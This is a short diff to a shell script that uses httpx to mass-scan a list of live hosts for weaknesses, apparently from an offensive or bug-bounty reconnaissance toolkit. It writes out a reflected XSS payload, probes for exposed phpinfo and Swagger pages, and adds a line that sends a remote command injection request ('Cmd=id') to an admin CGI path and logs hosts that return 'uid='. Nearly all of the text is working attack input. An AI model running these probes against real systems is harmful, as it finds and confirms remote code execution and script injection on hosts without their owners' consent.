@@ -30,3 +30,4 @@ httpx -l httpxfinder/lives.txt -t 50 -ports 80,443,8080,8443,8081,8180,8090,8009
 httpx -l httpxfinder/lives.txt -t 50 -ports 80,443,8080,8443 -path "/?xss=\"</script><script>alert(\"XSS\")</script>" -mr "<script>alert(\"XSS\")</script>" >> httpxfinder/xss.txt
 httpx -l httpxfinder/lives.txt -t 50 -path /phpinfo.php --status-code --content-length -title -mc 200,302  >> httpxfinder/phpinfo.txt
 httpx -l httpxfinder/lives.txt -t 50 -path /swagger-api --status-code --content-length -mc 200,302 >> httpxfinder/swagger.txt
+httpx -l httpxfinder/lives.txt -t 50 -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent >> httpxfinder/rce.txt
